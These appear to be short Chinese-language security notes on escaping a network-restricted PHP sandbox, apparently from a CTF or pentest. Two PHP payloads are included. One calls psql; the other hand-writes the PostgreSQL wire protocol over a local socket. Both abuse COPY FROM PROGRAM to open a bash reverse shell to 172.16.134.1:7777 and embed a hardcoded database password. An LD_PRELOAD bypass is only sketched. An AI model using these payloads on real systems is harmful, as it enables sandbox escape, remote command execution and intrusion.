### ssrf打redis


### php沙箱
限制
```bash
iptables -A OUTPUT -m owner --uid-owner sandbox -j REJECT
```
不允许sandbox输出流量,即发送数据到外部网络

- 上传php代码,会在沙箱执行
- sandbox用户无法通信,但是可以通过local socket与postgre进程通信

1. 通过`proc_open`函数执行命令
```php
<?php
$shell = "psql --command \"DROP TABLE IF EXISTS cmd_exec;CREATE TABLE 
cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'sh -i >& 
/dev/tcp/172.16.134.1/7777 0>&1';SELECT * FROM cmd_exec;\" 
\"user=postgres password=Dada2022QaxNb666\"";
echo($shell);
$a =array();
proc_open($shell,$a,$b);
?>
```

2. 通过LD_PRELD_PRELOAD,进行bypass
类似disable_function绕过
1. 生成一个.so文件
2. put_env LD_PRELOAD加载这个.so文件,然后利用某个函数出发这个动态链接库

```php

```

3. 手撸postgres通信协议

```php
<?php 
$input = "\0\0\0T\0\3\0\0user\0postgres\0database\0postgres\0application_name\0psql\0client_encoding\0UTF8\0\0";
$username = "postgres";
$password = "Dada2022QaxNb666";
$fp = stream_socket_client("unix:///tmp/.s.PGSQL.5432", $errno, $errstr, 30);
fwrite($fp, $input);
$res = fread($fp,1024);
$salt = substr($res, 9);
$input = "p\0\0\0(md5".md5(md5($password.$username).$salt)."\0";
fwrite($fp, $input);
$res = fread($fp,1024);
$input = "Q\0\0\0\247DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'sh -i >& /dev/tcp/172.16.134.1/7777 0>&1';SELECT * FROM cmd_exec;\0";
fwrite($fp, $input);
$res = fread($fp,1024);
```
